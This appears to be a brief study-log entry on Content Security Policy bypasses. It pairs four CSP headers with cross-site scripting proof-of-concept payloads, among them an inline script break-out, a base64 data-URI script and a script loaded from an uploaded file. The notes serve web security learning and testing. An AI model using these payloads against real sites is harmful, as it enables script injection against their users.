Daily Notes : Day 86
Content Security Policy Bypasses  - Part 1 

1. Unsafe Inline 
 Content-Security-Policy: script-src https://google.com 'unsafe-inline'; 
Working payload: "/><script>alert(1);</script>

2. Unsafe Eval 
Content-Security-Policy: script-src https://google.com 'unsafe-eval'; 
Working payload: <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

3. Lack of object-src and default-src
Content-Security-Policy: script-src 'self' ;

4. File Upload + 'self'
Content-Security-Policy: script-src 'self';  object-src 'none' ; 
Working payload: "/>'><script src="/uploads/picture.png.js"></script>
